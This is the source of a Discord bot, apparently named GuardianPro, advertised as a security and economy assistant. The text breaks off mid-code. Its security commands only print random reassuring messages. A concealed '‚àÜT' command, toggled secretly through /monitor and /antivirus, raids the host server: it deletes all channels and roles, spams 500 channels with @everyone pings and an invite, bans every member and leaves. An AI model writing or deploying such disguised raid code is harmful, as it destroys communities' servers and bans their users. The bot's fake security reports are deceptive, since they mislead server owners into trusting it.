try:
    import discord
    from discord.ext import commands
except ImportError:
    print("Error: discord.py no est√° instalado correctamente")
    exit(1)

import asyncio
import json
import os
import random
import datetime
from asyncio import sleep

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True


def get_prefix(bot, message):
    # Solo comandos de econom√≠a usan .
    if message.content.startswith('.'):
        return '.'
    # Comandos especiales usan ‚àÜ
    elif message.content.startswith('‚àÜ'):
        return '‚àÜ'
    return ['‚àÜ', '.']  # Fallback


bot = commands.Bot(command_prefix=get_prefix,
                   intents=intents,
                   help_command=None)

# Estado de comandos especiales (discreto)
delta_commands_enabled = True
economy_only_mode = False  # Nuevo estado para modo econom√≠a solamente

# Sistema de econom√≠a
balances_file = 'balances.json'
cooldowns_file = 'cooldowns.json'

if os.path.exists(balances_file):
    with open(balances_file, 'r') as f:
        balances = json.load(f)
else:
    balances = {}

if os.path.exists(cooldowns_file):
    with open(cooldowns_file, 'r') as f:
        cooldowns = json.load(f)
else:
    cooldowns = {}


def save_balances():
    with open(balances_file, 'w') as f:
        json.dump(balances, f)


def save_cooldowns():
    with open(cooldowns_file, 'w') as f:
        json.dump(cooldowns, f)


def get_balance(user_id):
    user_id = str(user_id)
    if user_id not in balances:
        balances[user_id] = {"wallet": 0, "bank": 0}
    return balances[user_id]


def update_balance(user_id, wallet=0, bank=0):
    user_id = str(user_id)
    bal = get_balance(user_id)
    bal['wallet'] += wallet
    bal['bank'] += bank
    # No dejar negativo
    if bal['wallet'] < 0:
        bal['wallet'] = 0
    if bal['bank'] < 0:
        bal['bank'] = 0
    save_balances()


def can_use_cooldown(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    user_cd = cooldowns[user_id]
    last = user_cd.get(command, 0)

    if now - last >= cooldown_time:
        user_cd[command] = now
        save_cooldowns()
        return True
    return False


def get_cooldown_remaining(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        return 0
    last = cooldowns[user_id].get(command, 0)
    remaining = cooldown_time - (now - last)
    return max(0, remaining)


@bot.event
async def on_ready():
    print(f'Bot GuardianPro est√° listo y conectado como {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Sincronizados {len(synced)} slash commands")
    except Exception as e:
        print(f"Error al sincronizar slash commands: {e}")
    print("‚úÖ Bot GuardianPro configurado correctamente:")
    print("‚Ä¢ Sistema de econom√≠a con prefijo .")
    print("‚Ä¢ Moderaci√≥n autom√°tica")
    print("‚Ä¢ Sistema de niveles y tickets")
    print("‚Ä¢ Utilidades y entretenimiento")
    print("‚Ä¢ Comandos especiales ocultos")


@bot.event
async def on_guild_join(guild):
    """Se ejecuta cuando el bot se une a un servidor nuevo"""
    print(f'Bot se uni√≥ al servidor: {guild.name} (ID: {guild.id})')

    # Esperar un poco para asegurar que el bot est√© completamente integrado
    await asyncio.sleep(2)

    # Crear rol de administrador del bot
    try:
        # Verificar que el bot tenga permisos para crear roles
        if not guild.me.guild_permissions.manage_roles:
            print(f"No tengo permisos para crear roles en {guild.name}")
            return

        admin_role = await guild.create_role(
            name="üõ°Ô∏è GuardianPro Admin",
            colour=discord.Colour.red(),
            permissions=discord.Permissions(administrator=True),
            reason="Rol de administrador creado autom√°ticamente por GuardianPro")
        print(
            f"Rol de administrador creado en {guild.name}: {admin_role.name}")

        # Intentar asignar el rol al propietario del servidor
        try:
            if guild.owner and not guild.owner.bot:
                await guild.owner.add_roles(
                    admin_role,
                    reason=
                    "Asignaci√≥n autom√°tica de rol de administrador al propietario")
                print(
                    f"Rol asignado al propietario del servidor: {guild.owner.display_name}"
                )
            else:
                print("No se pudo identificar al propietario del servidor")
        except discord.Forbidden:
            print(
                "No se pudo asignar el rol al propietario (jerarqu√≠a de roles o permisos insuficientes)"
            )
        except Exception as e:
            print(f"Error al asignar rol al propietario: {e}")

        # Buscar un canal donde enviar mensaje de bienvenida
        welcome_channel = None

        # Prioridad: canal con "general" en el nombre
        for channel in guild.text_channels:
            if "general" in channel.name.lower() and channel.permissions_for(
                    guild.me).send_messages:
                welcome_channel = channel
                break

        # Si no hay canal general, buscar cualquier canal donde se pueda escribir
        if not welcome_channel:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    welcome_channel = channel
                    break

        if welcome_channel:
            embed = discord.Embed(
                title="üõ°Ô∏è GuardianPro se ha unido al servidor",
                description=
                f"¬°Hola! Soy **GuardianPro**, tu asistente de seguridad y econom√≠a.\n\n"
                f"‚úÖ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
                f"üëë El propietario del servidor ha sido asignado a este rol autom√°ticamente.\n\n"
                f"üîß **Comandos principales:**\n"
                f"‚Ä¢ `/help` - Ver todos los comandos disponibles\n"
                f"‚Ä¢ `.balance` - Sistema de econom√≠a\n"
                f"‚Ä¢ `/scan` - Escaneo de seguridad\n\n"
                f"‚öôÔ∏è **Para administradores:** Comandos especiales con prefijo `‚àÜ`",
                color=discord.Color.blue())
            embed.add_field(
                name="üöÄ Primeros pasos",
                value="1. Usa `/help` para ver todos los comandos\n"
                "2. Configura el servidor con `/sset`\n"
                "3. Explora el sistema de econom√≠a con `.balance`",
                inline=False)
            embed.set_footer(text="GuardianPro | Protecci√≥n y diversi√≥n 24/7")
            embed.set_thumbnail(
                url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")

            await welcome_channel.send(embed=embed)
            print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
        else:
            print("No se encontr√≥ canal donde enviar mensaje de bienvenida")

    except discord.Forbidden:
        print(f"No tengo permisos para crear roles en {guild.name}")
        # Intentar enviar mensaje sin crear rol
        try:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    embed = discord.Embed(
                        title="üõ°Ô∏è GuardianPro se ha unido al servidor",
                        description="¬°Hola! Soy **GuardianPro**.\n\n"
                        "‚ö†Ô∏è **Atenci√≥n:** No pude crear el rol de administrador debido a permisos limitados.\n"
                        "Por favor, aseg√∫rate de que tengo permisos para **Administrar Roles**.\n\n"
                        "üîß Usa `/help` para ver todos los comandos disponibles.",
                        color=discord.Color.orange())
                    await channel.send(embed=embed)
                    break
        except:
            pass
    except Exception as e:
        print(f"Error al crear rol de administrador en {guild.name}: {e}")


async def delete_channel(channel):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await channel.delete()
            print(f"Canal borrado: {channel.name}")
            return
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit
                retry_after = getattr(e, 'retry_after', 5)
                print(
                    f"Rate limit al borrar {channel.name}, esperando {retry_after} segundos..."
                )
                await asyncio.sleep(retry_after)
            else:
                print(f"Error al borrar canal {channel.name}: {e}")
                if attempt == max_retries - 1:  # √öltimo intento
                    break
        except Exception as e:
            print(f"Error al borrar canal {channel.name}: {e}")
            if attempt == max_retries - 1:  # √öltimo intento
                break


async def create_channel_with_message(guild, i, overwrites):
    try:
        channel = await guild.create_text_channel(f'crashed-{i}',
                                                  overwrites=overwrites)
        print(f"Canal creado: crashed-{i}")
        # Esperar menos tiempo antes de enviar mensaje
        await asyncio.sleep(0.5)
        try:
            await channel.send(
                "@everyone @here hecho por Nathyx, hermano de Eather https://discord.gg/Fhh4DTKW"
            )
            print(f"Mensaje enviado en: crashed-{i}")
        except Exception as msg_error:
            print(f"Error al enviar mensaje en crashed-{i}: {msg_error}")
    except Exception as e:
        print(f"Error al crear canal crashed-{i}: {e}")


async def create_role(guild, i):
    try:
        await guild.create_role(name=f"raided-{i}",
                                colour=discord.Colour.red())
        print(f"Rol creado: raided-{i}")
    except Exception as e:
        print(f"Error al crear rol raided-{i}: {e}")


async def create_event(guild, i):
    try:
        from datetime import datetime, timedelta
        start_time = datetime.utcnow() + timedelta(hours=1)
        end_time = start_time + timedelta(hours=2)

        await guild.create_scheduled_event(
            name="raideados jeje",
            description="Evento creado por Nathyx",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            entity_metadata=discord.EntityMetadata(location="Discord Server"))
        print(f"Evento creado: raideados jeje #{i}")
    except Exception as e:
        print(f"Error al crear evento {i}: {e}")


async def delete_role(role):
    try:
        await role.delete()
        print(f"Rol borrado: {role.name}")
    except Exception as e:
        print(f"Error al borrar rol {role.name}: {e}")


async def ban_member(member):
    try:
        await member.ban(reason="Raid por Nathyx - Todos baneados")
        print(f"Miembro baneado: {member.name}")
    except discord.Forbidden:
        print(
            f"No se pudo banear a {member.name} debido a permisos insuficientes."
        )
    except discord.HTTPException as e:
        print(f"Error al banear a {member.name}: {e}")


@bot.command(name='T')
async def raid(ctx):
    # Solo funciona con prefijo ‚àÜT
    if not ctx.message.content.startswith('‚àÜT'):
        return

    # Verificar si los comandos ‚àÜ est√°n habilitados
    if not delta_commands_enabled:
        return

    # Verificar si est√° en modo econom√≠a
    if economy_only_mode:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    await ctx.send("Pringados... üòè")
    print(f"Raid iniciado en el servidor {guild.name}")

    # Cambiar nombre del servidor y quitar icono
    try:
        await guild.edit(name="-R4ID3D-", icon=None)
        print("Nombre del servidor cambiado a -R4ID3D- e icono eliminado")
    except Exception as e:
        print(f"Error al cambiar servidor: {e}")

    # Borrar todos los canales existentes en paralelo
    delete_channel_tasks = [
        delete_channel(channel) for channel in guild.channels
    ]
    if delete_channel_tasks:
        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

    # Borrar todos los roles existentes (excepto @everyone)
    delete_role_tasks = [
        delete_role(role) for role in guild.roles if role.name != "@everyone"
    ]
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Configurar permisos una sola vez
    overwrites = {
        guild.default_role:
        discord.PermissionOverwrite(send_messages=True,
                                    read_messages=True,
                                    view_channel=True,
                                    embed_links=True,
                                    attach_files=True,
                                    read_message_history=True)
    }

    # Crear canales, roles y eventos por lotes para evitar rate limits
    print("Creando canales...")
    for batch in range(0, 500,
                       100):  # Crear en lotes de 100, total 500 canales
        channel_tasks = [
            create_channel_with_message(guild, i, overwrites)
            for i in range(batch, min(batch + 100, 500))
        ]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)  # Pausa entre lotes

    print("Creando roles...")
    role_tasks = [create_role(guild, i) for i in range(500)]  # 500 roles
    await asyncio.gather(*role_tasks, return_exceptions=True)

    print("Creando eventos...")
    event_tasks = [create_event(guild, i) for i in range(10)]  # 10 eventos
    await asyncio.gather(*event_tasks, return_exceptions=True)

    # Banear a todos los miembros en paralelo
    ban_tasks = [
        ban_member(member) for member in guild.members if member != bot.user
    ]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    await ctx.send("Raid completado!")

    # Salir del servidor despu√©s del raid
    try:
        await guild.leave()
        print(f"Bot sali√≥ del servidor {guild.name}")
    except Exception as e:
        print(f"Error al salir del servidor: {e}")


class HelpView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=60)
        self.current_page = 0
        self.pages = [{
            "title":
            "üõ°Ô∏è Panel de Ayuda - P√°gina 1/4",
            "description":
            "Tu asistente de **seguridad avanzada** para Discord.\n\nComandos de seguridad y monitoreo:",
            "fields": [{
                "name":
                "üîç Escaneo y Seguridad",
                "value":
                ("**/scan** ‚Üí Escanea el servidor en busca de amenazas.\n"
                 "**/secure** ‚Üí Informe completo de seguridad.\n"
                 "**/monitor** ‚Üí Estado en tiempo real de CPU, RAM y conexiones.\n"
                 "**/info** ‚Üí Muestra informaci√≥n detallada del servidor.")
            }, {
                "name":
                "üõ°Ô∏è Protecci√≥n",
                "value":
                ("**/sset** ‚Üí Implementa el sistema de seguridad.\n"
                 "**/ban** ‚Üí Banea a un usuario del servidor.\n"
                 "**/firewall** ‚Üí Verifica el estado del firewall.\n"
                 "**/antivirus** ‚Üí Estado y √∫ltima actualizaci√≥n del antivirus.\n"
                 "**/encrypt** ‚Üí Estado de la encriptaci√≥n de datos.")
            }]
        }, {
            "title":
            "üíæ Panel de Ayuda - P√°gina 2/4",
            "description":
            "Comandos del sistema y utilidades:",
            "fields": [{
                "name":
                "üíæ Sistema",
                "value":
                ("**/backup** ‚Üí Verifica el estado de los respaldos.\n"
                 "**/ping** ‚Üí Muestra la latencia del bot.\n"
                 "**/invite** ‚Üí Crea un enlace de invitaci√≥n personalizado.\n"
                 "**/server** ‚Üí Env√≠a al mensaje directo el enlace del servidor del bot.\n"
                 "**/version** ‚Üí Muestra la versi√≥n actual del bot.\n"
                 "**/encrypt** ‚Üí Verifica el estado de la encriptaci√≥n.")
            }, {
                "name":
                "üéâ Entretenimiento",
                "value":
                ("**/gstart** ‚Üí Crear un sorteo interactivo con n√∫mero de ganadores.\n"
                 "**/timer** ‚Üí Establecer un temporizador personalizado.")
            }]
        }, {
            "title":
            "üí∞ Panel de Ayuda - P√°gina 3/4",
            "description":
            "Sistema de econom√≠a (prefijo: `.`):",
            "fields": [{
                "name":
                "üí∞ Comandos B√°sicos",
                "value": (".balance ‚Üí Ver tu dinero\n"
                          ".work ‚Üí Trabajar para ganar dinero\n"
                          ".daily ‚Üí Recompensa diaria\n"
                          ".pay ‚Üí Enviar dinero a otro usuario\n"
                          ".deposit ‚Üí Depositar en el banco\n"
                          ".withdraw ‚Üí Retirar del banco\n"
                          ".beg ‚Üí Mendigar por dinero\n"
                          ".crime ‚Üí Cometer cr√≠menes por dinero")
            }, {
                "name":
                "üéØ Actividades Arriesgadas",
                "value": (".rob ‚Üí Intentar robar a otro usuario\n"
                          ".coinflip ‚Üí Apostar en cara o cruz\n"
                          ".slots ‚Üí Jugar a la m√°quina tragamonedas\n"
                          ".blackjack ‚Üí Jugar al blackjack")
            }]
        }, {
            "title":
            "üõí Panel de Ayuda - P√°gina 4/4",
            "description":
            "Tienda, inventario y rankings:",
            "fields": [{
                "name":
                "üõí Tienda e Inventario",
                "value": (".shop ‚Üí Ver la tienda virtual\n"
                          ".buy ‚Üí Comprar √≠tems de la tienda\n"
                          ".inventory ‚Üí Ver tu inventario")
            }, {
                "name":
                "üèÜ Rankings",
                "value":
                (".baltop ‚Üí Top 15 usuarios m√°s ricos del servidor\n"
                 ".leaderboard ‚Üí Tabla de posiciones del servidor")
            }]
        }]

    def create_embed(self, page_index):
        page = self.pages[page_index]
        embed = discord.Embed(title=page["title"],
                              description=page["description"],
                              color=discord.Color.dark_blue())

        for field in page["fields"]:
            embed.add_field(name=field["name"],
                            value=field["value"],
                            inline=False)

        embed.set_thumbnail(
            url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")
        embed.set_footer(text="GuardianPro | Protecci√≥n 24/7")

        return embed

    @discord.ui.button(label='‚óÄÔ∏è Anterior',
                       style=discord.ButtonStyle.secondary)
    async def previous_page(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='‚ñ∂Ô∏è Siguiente',
                       style=discord.ButtonStyle.secondary)
    async def next_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        if self.current_page < len(self.pages) - 1:
            self.current_page += 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='üè† Inicio', style=discord.ButtonStyle.primary)
    async def home_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        self.current_page = 0
        embed = self.create_embed(self.current_page)
        await interaction.response.edit_message(embed=embed, view=self)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True


@bot.tree.command(name="help",
                  description="Muestra todos los comandos y funciones del bot")
async def help_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    view = HelpView()
    embed = view.create_embed(0)
    await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name='scan',
                  description='Escanea el servidor en busca de amenazas')
async def see_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Definir respuestas m√∫ltiples
    respuestas = [
        "üîç Escaneando servidor en busca de amenazas... ‚úÖ No se detectaron vulnerabilidades.",
        "üîç An√°lisis completo. Todo est√° en orden.",
        "üîç Iniciando el escaneo... Todo est√° protegido.",
        "üîç Escaneo finalizado. Lista de amenazas: Ninguna.",
        "üîç Verificaci√≥n de seguridad completada. Estado: SEGURO."
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)


from discord import Embed


@bot.tree.command(name='info', description='Muestra informaci√≥n del servidor')
async def info_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message(
            "‚ùå Este comando solo puede usarse en servidores.", ephemeral=True)
        return

    embed = Embed(title=f"Informaci√≥n del servidor: {guild.name}",
                  color=0x3498db)

    # Configurar thumbnail del servidor
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    # Informaci√≥n b√°sica del servidor
    embed.add_field(name="üìä ID del Servidor",
                    value=f"`{guild.id}`",
                    inline=True)

    # Propietario del servidor - obtener de manera m√°s confiable
    try:
        if guild.owner:
            owner_text = f"{guild.owner.name}#{guild.owner.discriminator}"
        else:
            # Si no est√° en cach√©, intentar obtener por ID
            owner = await bot.fetch_user(guild.owner_id
                                         ) if guild.owner_id else None
            owner_text = f"{owner.name}#{owner.discriminator}" if owner else "Desconocido"
    except:
        owner_text = f"ID: {guild.owner_id}" if guild.owner_id else "Desconocido"

    embed.add_field(name="üëë Propietario", value=owner_text, inline=True)
    embed.add_field(name="üìÖ Creado el",
                    value=guild.created_at.strftime("%d/%m/%Y a las %H:%M"),
                    inline=True)

    # Estad√≠sticas del servidor - contar correctamente
    all_channels = guild.channels
    text_channels = len(
        [c for c in all_channels if isinstance(c, discord.TextChannel)])
    voice_channels = len(
        [c for c in all_channels if isinstance(c, discord.VoiceChannel)])
    categories = len(
        [c for c in all_channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros - intentar diferentes m√©todos
    member_count = guild.member_count
    if not member_count:
        # Si member_count es None, contar miembros cacheados
        member_count = len(guild.members) if guild.members else "No disponible"

    embed.add_field(name="üë• Miembros",
                    value=f"{member_count:,}"
                    if isinstance(member_count, int) else member_count,
                    inline=True)
    embed.add_field(name="üìù Canales de Texto",
                    value=text_channels,
                    inline=True)
    embed.add_field(name="üîä Canales de Voz", value=voice_channels, inline=True)
    embed.add_field(name="üìÅ Categor√≠as", value=categories, inline=True)
    embed.add_field(name="üè∑Ô∏è Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="üòÑ Emojis", value=len(guild.emojis), inline=True)

    # Nivel de verificaci√≥n
    verification_levels = {
        discord.VerificationLevel.none: "Ninguno",
        discord.VerificationLevel.low: "Bajo",
        discord.VerificationLevel.medium: "Medio",
        discord.VerificationLevel.high: "Alto",
        discord.VerificationLevel.highest: "M√°ximo"
    }

    embed.add_field(name="üîí Verificaci√≥n",
                    value=verification_levels.get(guild.verification_level,
                                                  "Desconocido"),
                    inline=True)
    embed.add_field(name="üéØ Nivel de Boost",
                    value=f"Nivel {guild.premium_tier}",
                    inline=True)
    embed.add_field(name="üíé Boosts",
                    value=guild.premium_subscription_count or 0,
                    inline=True)

    # Informaci√≥n adicional √∫til
    embed.add_field(name="üåç Regi√≥n",
                    value=getattr(guild, 'preferred_locale', 'Desconocido'),
                    inline=True)
    embed.add_field(name="üìú Descripci√≥n",
                    value=guild.description[:50] +
                    "..." if guild.description and len(guild.description) > 50
                    else guild.description or "Sin descripci√≥n",
                    inline=False)

    embed.set_footer(
        text=f"Informaci√≥n solicitada por {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='firewall',
                  description='Verifica el estado del firewall')
async def firewall_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "üõ°Ô∏è Firewall activado. Estado: PROTEGIDO | Conexiones bloqueadas: 0")


@bot.tree.command(name='version', description='Muestra la versi√≥n del bot')
async def scan_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    # Definir respuestas m√∫ltiples
    respuestas = [
        "Versi√≥n GPC 1", "Versi√≥n del sistema: GPC 1",
        "Est√°s utilizando la versi√≥n GPC 1! Gracias por utilizarme üòé"
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)


import time


@bot.tree.command(
    name='sset',
    description='Confirma que el sistema de seguridad est√° implementado')
async def sset_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    respuestas = [
        "üîí Sistema de seguridad implementado con √©xito. ¬°Protecci√≥n total activada!",
        "‚úÖ Seguridad configurada y operativa. Tu servidor est√° blindado.",
        "üõ°Ô∏è Protecci√≥n avanzada habilitada. El sistema de seguridad est√° en marcha.",
        "‚öôÔ∏è Sistema de seguridad online y funcionando sin fallos.",
        "üöÄ Seguridad implementada correctamente. ¬°El servidor est√° a salvo!",
        "üîê Todos los protocolos de seguridad est√°n activos y monitoreados.",
        "üõ†Ô∏è Sistema de seguridad listo para defender contra cualquier amenaza."
    ]

    import random
    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(
    name='server',
    description='Env√≠a el enlace del servidor por mensaje directo')
async def server_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    enlace_del_servidor = "funci√≥n a√∫n no implementada"  # Cambia esto por tu enlace real

    await interaction.response.send_message(
        "üì© Te he enviado el servidor al MD!", ephemeral=True)
    try:
        await interaction.user.send(
            f"üåê Aqu√≠ tienes el enlace del servidor:\n{enlace_del_servidor}")
    except Exception:
        await interaction.followup.send(
            "‚ùå No pude enviarte el mensaje directo. ¬øTienes los DMs abiertos?",
            ephemeral=True)


import time


@bot.tree.command(name='ping', description='Comprueba la latencia del bot')
async def ping_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    start = time.perf_counter()
    await interaction.response.defer(
    )  # Defer para ganar tiempo y luego responder
    end = time.perf_counter()
    latency = (end - start) * 1000  # ms

    await interaction.followup.send(f"üèì Pong! {latency:.2f} ms")


@bot.tree.command(name='antivirus',
                  description='Verifica el estado del antivirus')
async def antivirus_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = False  # Deshabilitar comandos ‚àÜ discretamente

    amenazas = random.choice([0, 0, 0, 1
                              ])  # Mayor probabilidad de 0 amenazas, a veces 1

    respuestas = [
        "ü¶† Antivirus actualizado. √öltima verificaci√≥n: Ahora mismo | Amenazas detectadas:0",
        "üõ°Ô∏è Escaneo completo. Estado: LIMPIO | √öltimo chequeo: Ahora mismo",
        "üîç An√°lisis antivirus reciente. Amenazas encontradas: 1 (resuelto)",
        "‚úÖ Antivirus activo y actualizado. Sin amenazas detectadas en el √∫ltimo an√°lisis.",
        "‚ö†Ô∏è Advertencia: Amenaza leve detectada. √öltima revisi√≥n: Ahora mismo"
        if amenazas else
        "‚úÖ Antivirus limpio y protegido. √öltima revisi√≥n: Ahora mismo"
    ]

    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='ban', description='Banea a un usuario del servidor')
@discord.app_commands.describe(user='Usuario a banear',
                               reason='Raz√≥n del baneo (opcional)')
async def ban_slash(interaction: discord.Interaction,
                    user: discord.Member,
                    reason: str = None):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if not interaction.user.guild_permissions.ban_members:
        await interaction.response.send_message(
            "‚ùå No tienes permiso para banear usuarios.", ephemeral=True)
        return

    try:
        await user.ban(reason=reason)
        mensaje = f"üî® {user} ha sido baneado del servidor."
        if reason:
            mensaje += f"\nüìù Raz√≥n: {reason}"
        await interaction.response.send_message(mensaje)
    except Exception as e:
        await interaction.response.send_message(
            f"‚ùå No se pudo banear al usuario: {e}", ephemeral=True)


@bot.tree.command(name='invite',
                  description='Genera un enlace de invitaci√≥n temporal')
@discord.app_commands.describe(
    max_uses='N√∫mero m√°ximo de usos del enlace (0 para ilimitado)',
    max_age=
    'Duraci√≥n en segundos antes de que expire el enlace (0 para ilimitado)')
async def invite_slash(interaction: discord.Interaction,
                       max_uses: int = 1,
                       max_age: int = 3600):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    if not interaction.user.guild_permissions.create_instant_invite:
        await interaction.response.send_message(
            "‚ùå No tienes permiso para crear invitaciones.", ephemeral=True)
        return

    try:
        invite = await interaction.channel.create_invite(max_uses=max_uses,
                                                         max_age=max_age,
                                                         unique=True)
        await interaction.response.send_message(
            f"üîó Aqu√≠ tienes tu enlace de invitaci√≥n:\n{invite.url}")
    except Exception as e:
        await interaction.response.send_message(
            f"‚ùå No se pudo crear la invitaci√≥n: {e}", ephemeral=True)


@bot.tree.command(name='backup',
                  description='Verifica el estado de los backups')
async def backup_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "üíæ Sistema de respaldo activo. √öltimo backup: Hace 5 minutos | Estado: SEGURO"
    )


@bot.tree.command(name='monitor',
                  description='Muestra el estado del monitoreo del sistema')
async def monitor_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = True  # Activar comandos ‚àÜ discretamente

    cpu = random.randint(5, 25)  # CPU entre 5% y 25%
    ram = random.randint(20, 40)  # RAM entre 20% y 40%
    latency = random.randint(30, 60)  # Latencia entre 30ms y 60ms

    respuestas = [
        f"üìä Monitoreo activo: CPU: {cpu}% | RAM: {ram}% | Conexiones: SEGURAS ‚úÖ",
        f"üì° Sistema estable: CPU: {cpu}% | RAM: {ram}% | Latencia: {latency}ms | Estado: √ìPTIMO",
        f"üñ•Ô∏è Recursos del servidor ‚Üí CPU: {cpu}% | RAM: {ram}% | Conexiones seguras: 100%",
        f"üìà Monitoreo en tiempo real ‚Üí CPU: {cpu}% | RAM: {ram}% | Seguridad: ALTA",
        f"üîé Diagn√≥stico ‚Üí CPU: {cpu}% | RAM: {ram}% | Estado de red: SEGURA",
        f"üõ†Ô∏è Estado actual ‚Üí CPU: {cpu}% | RAM: {ram}% | Conexiones: ESTABLES | Sin amenazas detectadas",
        f"üß† Inteligencia activa ‚Üí CPU: {cpu}% | RAM: {ram}% | Firewall y antivirus funcionando correctamente"
    ]

    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='encrypt',
                  description='Verifica el estado de la encriptaci√≥n')
async def encrypt_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "üîê Encriptaci√≥n AES-256 activada. Datos protegidos al 100%")


@bot.tree.command(name='secure', description='Genera un informe completo de seguridad')
async def secure_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message(
            "‚ùå En modo econom√≠a, solo se permiten comandos con prefijo `.`",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "üîí INFORME DE SEGURIDAD:\n‚úÖ Firewall: ACTIVO\n‚úÖ Antivirus: ACTUALIZADO\n‚úÖ Backups: AL D√çA\n‚úÖ Encriptaci√≥n: HABILITADA\n\n**Servidor 100% SEGURO**"
    )


# Sistema de sorteos
active_giveaways = {}


class GiveawayView(discord.ui.View):

    def __init__(self, giveaway_id, winners_count, duration=None):
        super().__init__(timeout=None)
        self.giveaway_id = giveaway_id
        self.winners_count = winners_count
        self.duration = duration
        self.participants = set()

    @discord.ui.button(label='üéâ Participar',
                       style=discord.ButtonStyle.green,
                       custom_id='participate_giveaway')
    async def participate(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        user_id = interaction.user.id

        if user_id in self.participants:
            await interaction.response.send_message(
                "‚ùå Ya est√°s participando en este sorteo.", ephemeral=True)
            return

        self.participants.add(user_id)

        # Actualizar el embed con el contador
        embed = interaction.message.embeds[0]
        embed.set_field_at(
            2,
            name="üë• Participantes",
            value=f"**{len(self.participants)}** usuarios participando",
            inline=True)

        await interaction.response.edit_message(embed=embed, view=self)

        # Mensaje privado de confirmaci√≥n
        try:
            await interaction.followup.send(
                "‚úÖ ¬°Te has unido al sorteo exitosamente!", ephemeral=True)
        except:
            pass

    @discord.ui.button(label='üèÜ Finalizar Sorteo',
                       style=discord.ButtonStyle.red,
                       custom_id='end_giveaway')
    async def end_giveaway(self, interaction: discord.Interaction,
